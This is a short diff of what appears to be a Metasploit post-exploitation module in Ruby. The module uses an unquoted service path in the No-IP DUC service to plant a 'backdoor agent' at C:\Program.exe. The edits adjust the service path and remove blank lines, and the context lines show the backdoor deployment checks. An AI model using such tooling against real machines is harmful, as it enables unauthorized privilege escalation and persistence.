@@ -185,7 +185,7 @@ def ls_stage1
   bin_shell = "Program.exe"                                   # service-binary name
   bin_path = "C:\\Program.exe"                                # remote deploy path
   local_path = datastore['LOCAL_PATH']                        # /root/Program.exe
-  service_path = "%programfiles(x86)%\\No-IP\\ducservice.exe" # binary_path_name
+  service_path = "%programfiles%\\No-IP\\ducservice.exe" # binary_path_name
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'] == 'nil'
@@ -197,7 +197,6 @@ def ls_stage1
     sleep(1.0)
   end
 
- 
     # check if vulnerable service (executable) exists
     if client.fs.file.exist?("#{service_path}")
       print_warning("Remote service: NoIPDUCService4 found!")
@@ -291,8 +290,7 @@ def ls_stage2
       print_error("BACKDOOR_AGENT: #{bin_path}")
       print_line("")
     end
- 
- 
+  
   # error exception funtion
   rescue ::Exception => e
   print_error("Error: #{e.class} #{e}")
@@ -453,7 +451,6 @@ def ls_stage4
     sleep(1.5)
   end
 
-
     # check if backdoor.exe exist in target
     if client.fs.file.exist?("#{bin_name}")
       print_good(" Backdoor agent: #{bin_name} found!")
@@ -477,7 +474,6 @@ def ls_stage4
       print_error("BACKDOOR_AGENT: #{bin_name}")
       print_line("")
     end
-
 
   # error exception funtion
   rescue ::Exception => e
